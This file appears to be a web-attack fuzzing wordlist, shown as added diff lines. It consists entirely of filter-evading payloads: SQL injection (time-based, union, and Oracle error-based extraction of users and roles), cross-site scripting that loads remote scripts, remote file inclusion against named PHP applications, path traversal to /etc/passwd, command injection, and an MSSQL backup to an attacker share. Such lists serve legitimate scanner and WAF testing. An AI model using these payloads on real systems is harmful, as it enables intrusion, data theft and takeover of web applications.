+&lt;IMG--%0ASRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041&gt;
+/mkportal/include/ user  .php?MK_PATH=XXpathXX
+%22%20%6F%72%20%31%3D%31%2D%2D
+/com_directory/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=XXpathXX? and '0having'='0having'
+' or 1 --'%00
+&lt;DIV STYLE=\"width&#58; expression(alert(%bf%27XSS'));\"&gt;
+%<%o%b%j%e%c%t %d%a%t%a%=%"%d%a%t%a%:%t%e%x%t%/%h%t%m%l%;%b%a%s%e%6%4%,%P%H%N%j%c%m%l%w%d%D%5%h%b%G%V%y%d%C%g%x%K%T%w%v%c%2%N%y%a%X%B%0%P%g%=%=%"%>
+/sources/lostpw.php?FORM[set]=1&FORM[session_id]=1&CONFIG[path]=XXpathXX-- sp_password
+%2F%30%78%32%65%30%78%32%65%2F%30%78%32%65%30%78%32%65%2F%30%78%32%65%30%78%32%65%2F%7B%46%49%4C%45%7D
+/amazon/cart.php?cmd=a/**/dd&asin=XXpathXX
+"%23VTTlwXZ%0Awaitfor%23KShSnzfBAR%0Adelay%23qsCHfICpp%0A'0:0:20'%23gYOlXFk%0A/*
+%u002F%u0061%u0064%u006D%u0069%u006E%u002F%u0061%u0064%u006D%u0069%u006E%u005F%u0075%u0073%u0065%u0072%u0073%u002E%u0070%u0068%u0070%u003F%u0070%u0068%u0070%u0062%u0062%u005F%u0072%u006F%u006F%u0074%u005F%u0070%u0061%u0074%u0068%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+; id
+/language/lang_german/lang_main_album.php?phpbb_root_path=XXpathXX?a=
+") and 0=benchmark(3000000,MD5(1))%20/*-- sp_password
+D:\inetpub\wwwroot\/*!global*/.asa
+Redirect%23SINZBzGJhj%0A302%23lQoTCozO%0A/a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser
+%u0022%u0029%u0029%u0029%u0029%u0020%u0061%u006E%u0064%u0020%u0030%u003D%u0062%u0065%u006E%u0063%u0068%u006D%u0061%u0072%u006B%u0028%u0033%u0030%u0030%u0030%u0030%u0030%u0030%u002C%u004D%u0044%u0035%u0028%u0031%u0029%u0029%u0020%u002D%u002D
+&lt;IMG /*!30263DYNSRC=\"javascript&*/#058;alert('XSS')\"&gt;
+%C0%AFchat%C0%AFadminips%C0%AEphp%C0%BFbanned%C0%DFfile%C0%BFXXpathXX
+/index.php?language%23isgFTFEgoy%0A=XXpathXX?
+/web/BetaBlockModules/AboutUserModule/AboutUserModule.php?path_prefix=XXpathXX%00
+; or '4479'='4479' and '0having'='0having'
+"))%23InoHdudzcRT%0Aand%23PzCobVUH%0A0=benchmark(3000000,MD5(1))%20%23
+%2F%63%68%61%74%2F%75%73%65%72%73%5F%70%6F%70%75%70%4C%2E%70%68%70%33%3F%46%72%6F%6D%3D%58%58%70%61%74%68%58%58
+&lt;LINK REL=\"stylesheet\" HREF=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;css\"&gt;%00
+' AND%091 LIKE utl_inaddr.get_host_address((SELECT%09DISTINCT(table_name) FROM%09(SELECT%09DISTINCT(table_name), ROWNUM AS%09LIMIT%09FROM%09sys.all_tables) WHERE%09LIMIT%09LIKE 5)) AND%09'i' LIKE 'i
+%C0%AF%C0%AE%C0%AE%C0%DE%C0%DE%C0%DE%C0%AE%C0%AE%C0%DE%C0%DE%C0%DE%C0%AE%C0%AE%C0%DE%C0%DE%C0%DE%C0%FBFILE%C0%FF
+'%23tIzxeRU%0AAND%23ddgTpNZH%0A1=utl_inaddr.get_host_address((SELECT%23tJeOsDxUCP%0ADISTINCT(USERNAME)%23FPHjiBygvvrs%0AFROM%23CJwNKw%0A(SELECT%23QqYbqRVY%0ADISTINCT(USERNAME),%23bpMFvoE%0AROWNUM%23GMvcKa%0AAS%23JKggZFi%0ALIMIT%23JexQEhf%0AFROM%23TQsYUhVX%0ASYS.ALL_USERS)%23PajsYypupVk%0AWHERE%23ZzOwCfq%0ALIMIT=5))%23aMqTYqVRfFp%0AAND%23LypufRG%0A'i'='i
+:response.write 111111%00
+%C0%AFsupasite%C0%AFadmin%C0%DFauth%C0%DFcookies%C0%AEphp%C0%BFsupa%C0%DBdb%C0%DFpath%C0%DF%C0%BFXXpathXX
+/Contenido_4.8.4/contenido/cronjobs/run_newsletter_job.php?cfg[path][contenido]=XXpathXX?
+"))) /*!30310and 0=benchmark(3000000,MD5(1))%20*/--
+%61%73%63
+/home/www/images/doc/index2.php?type=XXpathXX%00
+L2FkbWluaXN0cmF0b3IvY29tcG9uZW50cy9jb21fbW9zbWVkaWEvaW5jbHVkZXMvY3JlZGl0cy5odG1sLnBocD9tb3NDb25maWdfYWJzb2x1dGVfcGF0aD1YWHBhdGhYWA==
+&lt;IMG SRC LIKE \"javascript&#058;alert('XSS')\"
+/phplib/VeRsIOn/1.3.3/functionen/ref_kd_rubrik.php?tt_docroot=XXpathXX
+23%0DOR%0C1=1
+%252F%2566%256F%2572%2575%256D%252F%256D%2561%2569%256C%252E%2570%2568%2570%253F%2572%2565%2570%2565%2572%2574%256F%2572%2579%256C%2565%2576%2565%256C%253D%2558%2558%2570%2561%2574%2568%2558%2558%253F
+"<xml%0DID=I><X><C><![CDATA[<IMG%0ASRC=""javas]]><![CDATA[cript:alert('XSS');"">]]>"
+/0_admin/modules/Wochenkarte/frontend/index.jsp?x_admindir=$$path$$?
+%EF%BC%87 or %EF%BC%87something%EF%BC%87 like %EF%BC%87some%%EF%BC%87
+<SCRIPT+SRC=http://ha.ckers.org/xss.js></SCRIPT>
+"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+/web/BetaBlockModules/ImagesMediaGalleryModule/ImagesMediaGalleryModule.php?current_blockmodule_pathXXpathXX-- sp_password
+/..\\\..\\\..\\\{FILE}-- sp_password
+Ly4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uXC4uXC4uXC4uXC4uXC4uXC4uXC4uXHtGSUxFfQ==
+%u002F%u002E%u002E%u00c0%u002f%u002E%u002E%u00c0%u002f%u002E%u002E%u00c0%u002f%u002E%u002E%u00c0%u002f%u002E%u002E%u00c0%u002f%u002E%u002E%u00c0%u002f%u002E%u002E%u00c0%u002f%u002E%u002E%u00c0%u002f%u007B%u0046%u0049%u004C%u0045%u007D
+%2F%69%6E%63%5F%6D%61%6E%61%67%65%72%2E%70%68%70%3F%69%6E%63%6C%75%64%65%5F%70%61%74%68%3D%58%58%70%61%74%68%58%58%3F
++|+dir+c:\+|
+yor--slbhRFc%0A1=1--HvaWwIEyzpqI%0A--
+%C0%AF%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%FBFILE%C0%FF
+%22%20%6F%72%20%34%34%37%39%3D%34%34%37%39%2D%2D
+%C0%AFboard%C0%AFpost%C0%AEphp%C0%BFqb%C0%DFpath%C0%BFXXpathXX
+'))--BLftOt%0Aor--kaPldRTOtih%0Asleep(__TIME__)='
+../../../../../../../../../../boot.ini-- sp_password
+%2F%77%2D%61%67%6F%72%61%5F%70%61%74%68%2F%64%65%6C%65%74%65%5F%6E%6F%74%65%73%2E%70%68%70%3F%62%6E%5F%64%69%72%5F%64%65%66%61%75%6C%74%3D%58%58%70%61%74%68%58%58%3F
+%u002F%u006C%u0069%u0062%u0072%u0061%u0072%u0069%u0065%u0073%u002F%u0063%u006F%u006D%u006D%u0065%u006E%u0074%u002F%u0070%u006F%u0073%u0074%u0043%u006F%u006D%u006D%u0065%u006E%u0074%u002E%u0070%u0068%u0070%u003F%u0070%u0061%u0074%u0068%u005B%u0063%u0062%u005D%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058%u003F%u0061%u003D
+%0a+dir+c:%255c
+$%26%26dir%0Cc:\
+/agenda2.php3?rootagenda=XXpathXX
+(select%23%0A99999999%23%0Afrom%23%0Apg_sleep(15))%23%0Aas%23%0Atest
+%u003C%u0049%u004D%u0047%u0020%u0053%u0052%u0043%u003D%u006A%u0061%u0076%u0061%u0073%u0063%u0072%u0069%u0070%u0074%u003A%u0061%u006C%u0065%u0072%u0074%u0028%u0053%u0074%u0072%u0069%u006E%u0067%u002E%u0066%u0072%u006F%u006D%u0043%u0068%u0061%u0072%u0043%u006F%u0064%u0065%u0028%u0038%u0038%u002C%u0038%u0033%u002C%u0038%u0033%u0029%u0029%u003E
+%bf%27),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+<DIV%0DSTYLE="background-image: url(javascript:alert('XSS'))">
+%'%)%,%N%U%L%L%,%N%U%L%L%,%N%U%L%L%,%N%U%L%L%,%N%U%L%L%,%N%U%L%L%,%N%U%L%L%,%N%U%L%L%)%20%w%a%i%t%f%o%r%20%d%e%l%a%y%20%'%0%:%0%:%2%0%'%20%/%*
+') or 1 LIKE 1 or ('1' LIKE '1
+%C0%AFphpSiteBackup%C0%AF0%C0%AE1%C0%AFpcltar%C0%AElib%C0%AEphp%C0%BFg%C0%DFpcltar%C0%DFlib%C0%DFdir%C0%BFXXpathXX
+%w%a%i%t%f%o%r %d%e%l%a%y %'%0%:%0%:%2%0%' %/%*
+/adm/my_statistics.php?DOCUMENT_ROOT=XXpathXX?%00
+%C0%AFskins%C0%AFdefault%C0%AEphp%C0%BFdir%C0%DFinc%C0%BFXXpathXX
+BACKUP    database   master   to    disks='\\<attackerip>\<attackerip>\backupdb.dat'
+%EF%BC%87),NULL,NULL)%20waitfor%20delay%20%EF%BC%870:0:20%EF%BC%87%20/*
+'/*!AND*/1=utl_inaddr.get_host_address((/*!SELECT*/DISTINCT(granted_role)/*!FROM*/(/*!SELECT*/DISTINCT(granted_role), ROWNUM/*!AS*//*!LIMIT*//*!FROM*/dba_role_privs/*!WHERE*/GRANTEE=SYS.LOGINUSER)/*!WHERE*//*!LIMIT*/=7))/*!AND*/'i'='i
+%/%p%h%p%y%a%b%s%/%m%o%d%u%l%i%/%l%i%b%r%i%/%i%n%d%e%x%.%p%h%p%?%A%z%i%o%n%e%=%X%X%p%a%t%h%X%X
+/$$%u2215$$%u2215$$%u2215{FILE}
+%C0%AF%C0%AF%C0%AF%C0%AF%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%C0%FBFILE%C0%FF
+1)) or sleep(__TIME__)#
+select/**/current_setting('krb_server_keyfile');
+/portfolio/commentaires/derniers_commentaires.php?rep=XXpathXX? and '0having'='0having'
+%252F%2561%2575%2574%2568%252F%2561%2575%2574%2568%252E%2570%2568%2570%253F%2570%2568%2570%2562%2562%255F%2572%256F%256F%2574%255F%2570%2561%2574%2568%253D%2558%2558%2570%2561%2574%2568%2558%2558
+"%0Aor%05pg_sleep(__TIME__)--
+/index.php?abs_path=XXpathXX?
+'/**/  or /**/1/**/=/**/1
+"    or   'W'='W' --
+%2F%25%75%66%66%30%65%25%75%66%66%30%65%5C%7B%46%49%4C%45%7D
+' union select * from users where login LIKE char(114,111,111,116);
+%/%%%u%f%f%0%e%%%u%f%f%0%e%/%%%u%f%f%0%e%%%u%f%f%0%e%/%%%u%f%f%0%e%%%u%f%f%0%e%/%{%F%I%L%E%}
+/config/config_member.php?INC=XXpathXX?%00
+'/*!0union+/*!0select+owner,/*!0null,/*!0null,/*!0null,/*!0null+/*!0from+all_tables每
++iF(benchmark(3000000,MD5(1)),NuLl,NuLl),NuLl,NuLl,NuLl,NuLl,NuLl,NuLl,NuLl,NuLl,NuLl)%20--
+%2572%2565%2570%256C%2561%2563%2565
+/settings_sql.php?path=XXpathXX and '0having'='0having'
+L2V4YW1wbGVzL3BhdEV4YW1wbGVHZW4vYmJjb2RlU291cmNlLnBocD9leGFtcGxlPVhYcGF0aFhY
+(sel/**/e/**/ct 99999999 fr/**/om pg_sleep(15))
+/phpi/edit_topics_feature.php?include_connection=XXpathXX-- sp_password
+%2F%2E%2E%25%63%31%25%39%63%2E%2E%25%63%31%25%39%63%2E%2E%25%63%31%25%39%63%2E%2E%25%63%31%25%39%63%2E%2E%25%63%31%25%39%63%2E%2E%25%63%31%25%39%63%2E%2E%25%63%31%25%39%63%7B%46%49%4C%45%7D
+L2NsX2ZpbGVzL2luZGV4LnBocD9wYXRoX3RvX2NhbGVuZGFyPVhYcGF0aFhYPw==
+%/%.%.%c0%2f%{%F%I%L%E%}
+/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php?dirroot=XXpathXX?&cmd=id
+/...\...\{FILE}
+/..\\\..\\\..\\\{/etc/passwd}
+%bf%27+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20-- and '0having'='0having'
+%u0026%u006C%u0074%u003B%u0053%u0043%u0052%u0049%u0050%u0054%u0020%u0061%u003D%u005C%u0022%u0026%u0067%u0074%u003B%u005C%u0022%u0020%u0027%u0027%u0020%u0053%u0052%u0043%u003D%u005C%u0022%u0068%u0074%u0074%u0070%u0026%u0023%u0035%u0038%u003B%u002F%u002F%u0068%u0061%u0026%u0023%u0034%u0036%u003B%u0063%u006B%u0065%u0072%u0073%u0026%u0023%u0034%u0036%u003B%u006F%u0072%u0067%u002F%u0078%u0073%u0073%u0026%u0023%u0034%u0036%u003B%u006A%u0073%u005C%u0022%u0026%u0067%u0074%u003B%u0026%u006C%u0074%u003B%u002F%u0053%u0043%u0052%u0049%u0050%u0054%u0026%u0067%u0074%u003B
+'+i/**/f(benchmark(3000000,MD5(1)),N/**/ULL,N/**/ULL),N/**/ULL,N/**/ULL,N/**/ULL,N/**/ULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL%09,NULL%09),NULL%09,NULL%09,NULL%09,NULL%09,NULL%09,NULL%09,NULL%09,NULL%09)%20--
+" or 1=1-- and '0having'='0having'
+%22/%3E%3CBODY%20onload=’document./*!write*/(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
+%/%m%o%d%/%l%i%s%t%e%/%i%n%d%e%x%.%p%h%p%?%c%o%n%f%i%g%[%p%a%t%h%M%o%d%]%=%X%X%p%a%t%h%X%X
+/%2f/%00
+%u002F%u004C%u0069%u0073%u0074%u0052%u0065%u0063%u006F%u0072%u0064%u0073%u002E%u0070%u0068%u0070%u003F%u006C%u0069%u0062%u005F%u0064%u0069%u0072%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058%u003F%u0026%u0063%u006D%u0064%u003D%u0069%u0064
+eHNzdGVzdA==
+&lt;IFRAME--%0ASRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/IFRAME&gt;
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:ti/**/me"><?import namespace="t" implementation="#d/**/e/**/fa/**/ult#ti/**/me2"><t:se/**/t attributeName="innerHTML" t/**/o="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
+#%0Eseparate%02fuzzfile%06for%02more%0Dflexibiity
+/\../\../{FILE} and '0having'='0having'
+%61%3B%2F%75%73%72%2F%62%69%6E%2F%69%64%7C
+%u002F%u002E%u002E%u0025%u0032%u0066%u002E%u002E%u0025%u0032%u0066%u002E%u002E%u0025%u0032%u0066%u002E%u002E%u0025%u0032%u0066%u002E%u002E%u0025%u0032%u0066%u002E%u002E%u0025%u0032%u0066%u007B%u0046%u0049%u004C%u0045%u007D
+/..%u2215..%u2215..%u2215{FILE}
+%/%m%i%d%d%l%e%.%p%h%p%?%f%i%l%e%=%X%X%p%a%t%h%X%X
+/module/forum/forum.php?fd LIKE XXpathXX LIKE ';
+JXAlcCVwJXAlcCVwJXAlcCVwJXAlcCVwJXAlcCVwJXAlcCVwJXAlcCVwJXAlcCVwJXAlcCVwJXAlcCVwJXAlcCVwJXAlcCVwJXAlcCVwJXAlcCVwJXAlcCVwJXAlcCVwJXAlcCVwJXAlcCVw
+%0%3%1%0%0%3%0%0%0%2%7%0%0%0%0
+/m2f/m2f_mailinglist.php?m2f_root_path=XXpathXX%00
+%2541%2541%2541%2541%2541%2525%2564
+L21vZGVybmJpbGwvaW5jbHVkZS9odG1sL2NvbmZpZy5waHA/RElSPVhYcGF0aFhY
++/*!if*/(benchmark(3000000,MD5(1)),/*!NULL*/,/*!NULL*/),/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/)%20%23
+L2Rvc2VhcmNoLnBocD9SRVNQQVRIPVhYcGF0aFhY
+%/%v%a%r%/%w%w%w%/%l%o%g%s%/%a%c%c%e%s%s%_%l%o%g
+'+/*!if*/(benchmark(3000000,MD5(1)),/*!NULL*/,/*!NULL*/),/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/)%20--
+/upload/xax/ossigeno/admin/install_module.php?level LIKE XXpathXX?
+ping%23gShUUOp%0A-i%23mnroGGGnFCt%0A30%23okYdLz%0A127.0.0.1
+/abf_js.php?abs_pfad=XXpathXX?&cmd=id%00
+/  module  /forum/forum.php?fd=XXpathXX=';
+' or 'unusual' = 'unusual'
+%2F%6D%6F%64%75%6C%65%73%2F%44%69%73%63%69%70%6C%69%6E%65%2F%43%61%74%65%67%6F%72%79%42%72%65%61%6B%64%6F%77%6E%54%69%6D%65%2E%70%68%70%3F%46%6F%63%75%73%50%61%74%68%3D%58%58%70%61%74%68%58%58
+/index.php?module=PostWrap&page=XXpathXX-- sp_password
+%2527%253B%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%2526%2523%2534%2536%253B%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%252F%252F%255C%2527%253B%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%2526%2523%2534%2536%253B%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%252F%252F%255C%2522%253B%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%2526%2523%2534%2536%253B%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%252F%252F%255C%255C%2522%253B%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%2526%2523%2534%2536%253B%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%252F%252F%252D%252D%2526%2567%2574%253B%2526%256C%2574%253B%252F%2553%2543%2552%2549%2550%2554%2526%2567%2574%253B%255C%2522%2526%2567%2574%253B%2527%2526%2567%2574%253B%2526%256C%2574%253B%2553%2543%2552%2549%2550%2554%2526%2567%2574%253B%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%2526%2523%2534%2536%253B%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2526%256C%2574%253B%252F%2553%2543%2552%2549%2550%2554%2526%2567%2574%253B
+/admin/includes/author_panel_header.php?level%23KKOQJZUZt%0A=XXpathXX?
+%252F%2561%2564%256D%2569%256E%2569%2573%2574%2572%2561%2574%256F%2572%252F%2563%256F%256D%2570%256F%256E%2565%256E%2574%2573%252F%2563%256F%256D%255F%2563%256C%2569%2563%256B%2568%2565%2561%2574%252F%2569%256E%2563%256C%2575%2564%2565%2573%252F%256F%2576%2565%2572%2576%2569%2565%2577%252F%256D%2561%2569%256E%252E%2570%2568%2570%253F%256D%256F%2573%2543%256F%256E%2566%2569%2567%255F%2561%2562%2573%256F%256C%2575%2574%2565%255F%2570%2561%2574%2568%253D%2558%2558%2570%2561%2574%2568%2558%2558
+$#lt;SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"$#gt;$#lt;/SPAN$#gt;
+%252F%2542%2565%2574%2561%2542%256C%256F%2563%256B%254D%256F%2564%2575%256C%2565%2573%252F%2545%256E%2561%2562%256C%2565%254D%256F%2564%2575%256C%2565%252F%2545%256E%2561%2562%256C%2565%254D%256F%2564%2575%256C%2565%252E%2570%2568%2570%253F%2570%2561%2574%2568%255F%2570%2572%2565%2566%2569%2578%253D%2558%2558%2570%2561%2574%2568%2558%2558
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE} and '0having'='0having'
+select+current_setting('password_encryption');
+/enth3/show_joined.php?p/**/ath=XXp/**/athXX
+/index.php?_REQUEST=&_REQUEST[opti/**/on]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=XXpathXX
+%/%c0%2e%c0%2e%/%c0%2e%c0%2e%/%c0%2e%c0%2e%/%c0%2e%c0%2e%/%c0%2e%c0%2e%/%{%F%I%L%E%}
+' u/**/n/**/ion (s/**/ele/**/ct @@v/**/e/**/rsi/**/on) --
+%255C%2575%2530%2530%2533%2543
+')))) waitfor delay '0:0:20' ---- sp_password
+%C0%AFdirection%C0%AFindex%C0%AEphp%C0%BFrepertoire%C0%DFconfig%C0%BFXXpathXX
+1)   or  pg_sleep(__TIME__)--
+%/%%%u%f%f%0%e%%%u%f%f%0%e%%%u%2%2%1%5%{%F%I%L%E%}
+root'/**/or/**/'1'='1
+/include/themes/themefunc.php?myNewsConf[p/**/ath][sys][index]=XXp/**/athXX?
+9999'||(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)||'9999-- sp_password
+%C0%AFfeed%C0%AEphp%C0%BFconfig%C0%DBroot%C0%DFordner%C0%DF%C0%BFXXpathXX%C0%BF%C0%AEcmd%C0%BFid
+/ss\\\ss\\\ss\\\{/etc/passwd}
+/mods/config/load.inc.php?moddir=XXpathXX?-- sp_password
+%2556%2545%2552%2553%2549%254F%254E%252D%2543%254F%254E%2554%2552%254F%254C
+%u002F%u006D%u0061%u006E%u0061%u0067%u0065%u005F%u0073%u006F%u006E%u0067%u0073%u002E%u0070%u0068%u0070%u003F%u0066%u006F%u0069%u006E%u0067%u005F%u0072%u006F%u006F%u0074%u005F%u0070%u0061%u0074%u0068%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+'))))))%23%0Awaitfor%23%0Adelay%23%0A'0:0:20'%23%0A/*
+9999'||(select%23RbAudrzISmG%0A%23RMfgRR%0Acount(*)%23cqMSQRpFE%0Afrom%23yiQSucLD%0A%23ntXmmFh%0AINFORMATION_SCHEMA.tables%23vwHeiVp%0Aas%23OiSAlizzHpk%0A%23nbmcrSFMq%0Asys1,INFORMATION_SCHEMA.tables%23zMiNwQzawl%0Aas%23tQldPA%0A%23ZrpVOOiYPiow%0Asys2,INFORMATION_SCHEMA.tables%23wpKebco%0Aas%23UNQTQos%0A%23tsGdecszpHnd%0Asys3,INFORMATION_SCHEMA.tables%23NkEAeu%0Aas%23eHYJuHXEt%0A%23OGOdjT%0Asys4,INFORMATION_SCHEMA.tables%23eZlvxe%0Aas%23AkIiqvIo%0A%23YBPrnXHNRRLu%0Asys5,INFORMATION_SCHEMA.tables%23dCcvFqPQWM%0Aas%23yKdCLAoyUvp%0A%23rGlDjzMfnab%0Asys6)||'9999
+%2F%66%6F%72%75%6D%2F%66%6F%72%75%6D%38%32%6C%69%62%2E%70%68%70%33%3F%72%65%70%65%72%74%6F%72%79%6C%65%76%65%6C%3D%58%58%70%61%74%68%58%58%3F
+%252F%2566%2569%256C%2565%2573%252F%256D%2562%256F%2578%252D%256C%2569%2573%2574%252E%2570%2568%2570%2533%253F%2542%2553%2558%255F%254C%2549%2542%2544%2549%2552%253D%2558%2558%2570%2561%2574%2568%2558%2558
+)))+and+0=benchmark(3000000,MD5(1))%20--
+/wapchat/src/eng.roomDeleteConfirm.php?sysFileDir=XXpathXX and '0having'='0having'
+/include/inc_ext/spaw/dialogs/TabLe.php?spaw_root=XXpathXX
+<!--<value><![CDATA[<XML--NDsYEgMiAL%0AID=I><X><C><![CDATA[<IMG--AcyfkNY%0ASRC="javas<![CDATA[cript:alert('XSS');">
+%2526%2520%2570%2569%256E%2567%2520%252D%2569%2520%2533%2530%2520%2531%2532%2537%252E%2530%252E%2530%252E%2531%2520%2526
+%u0022%u0020%u0077%u0061%u0069%u0074%u0066%u006F%u0072%u0020%u0064%u0065%u006C%u0061%u0079%u0020%u0027%u0030%u003A%u0030%u003A%u0032%u0030%u0027%u0020%u002D%u002D
+%/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%{%F%I%L%E%}
+9999%EF%BC%87+(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)+%EF%BC%879999
+%252F%2562%2561%2563%256B%2565%256E%2564%252F%2561%2564%2564%256F%256E%2573%252F%256C%2569%256E%256B%2573%252F%2569%256E%2564%2565%2578%252E%2570%2568%2570%253F%2550%2541%2554%2548%253D%2558%2558%2570%2561%2574%2568%2558%2558
+/.\..\{FILE}-- sp_password
+L2luY2x1ZGUvbW9uaXRvcmluZy9lbmdpbmUvTWFrZVhNTC5waHA/ZmlsZU9yZW9uQ29uZj1YWHBhdGhYWD8=
+/..%c1%9c..%c1%9c..%c1%9c{FILE}
+<div style="font-family:%bf%27foo&#10;;color:red;';">LOL
+"+if(benchmark(3000000,MD5(1)),null,null),null,null,null,null,null,null,null,null,null)%20/*
+declare--jvyaKLcO%0A@s--IoWIDlvdTa%0Avarchar(200)--dzHePuXRlnux%0Aselect--vYTWhXDJ%0A@s--pyJBKUyCOnEd%0A=--jZzzMXw%0A0x77616974666F722064656C61792027303A303A31302700--NMHHstRkDi%0Aexec(@s)
+PElNRyBTUkM9ImphdmFzY3JpcHQ6YWxlcnQoJ1hTUycpIg==
+select current_setting(%bf%27hba_file');
+-1%-1AOr%-1D-1=-1
+<IMG DYNSRC="javascript:alert('XSS')">%00
+/includes/lang/language.php?path_to_root LIKE XXpathXX
+/files/folder-rename.php3?BSX_LIBDIR=XXpathXX
+/inc/design.inc.php?dir[data]=XXpathXX and '0having'='0having'
+"%23lLyJPHKXJjRL%0Aor%23AavNSpmcTL%0A%23ywCTbJT%0A"a"="a
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20%00%270:0:20%00%27%20--
+%u002F%u0066%u0069%u006C%u0065%u0073%u002F%u0066%u006F%u006C%u0064%u0065%u0072%u002D%u0063%u0072%u0065%u0061%u0074%u0065%u002E%u0070%u0068%u0070%u0033%u003F%u0042%u0053%u0058%u005F%u004C%u0049%u0042%u0044%u0049%u0052%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+<OBJECT classid LIKE clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name LIKE url value LIKE javascript:alert('XSS')></OBJECT>
+%u002F%u0070%u0069%u0072%u0076%u0061%u0074%u0065%u002F%u006C%u0074%u0077%u0070%u0064%u0066%u006D%u006F%u006E%u0074%u0068%u002E%u0070%u0068%u0070%u003F%u006C%u0074%u0077%u005F%u0063%u006F%u006E%u0066%u0069%u0067%u005B%u0027%u0069%u006E%u0063%u006C%u0075%u0064%u0065%u005F%u0064%u0069%u0072%u005D%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+%u002F%u006D%u006F%u0064%u0075%u006C%u0065%u0073%u002F%u0065%u0076%u0065%u006E%u0074%u0073%u002F%u0069%u006E%u0064%u0065%u0078%u002E%u0070%u0068%u0070%u003F%u0066%u0075%u006C%u006C%u005F%u0070%u0061%u0074%u0068%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+%C0%AF%C0%AAor%C0%AA4479%C0%AAin%C0%AA%C0%AAselect%C0%AA%C0%CA%C0%CAversion%C0%AB%C0%AF%C0%AF
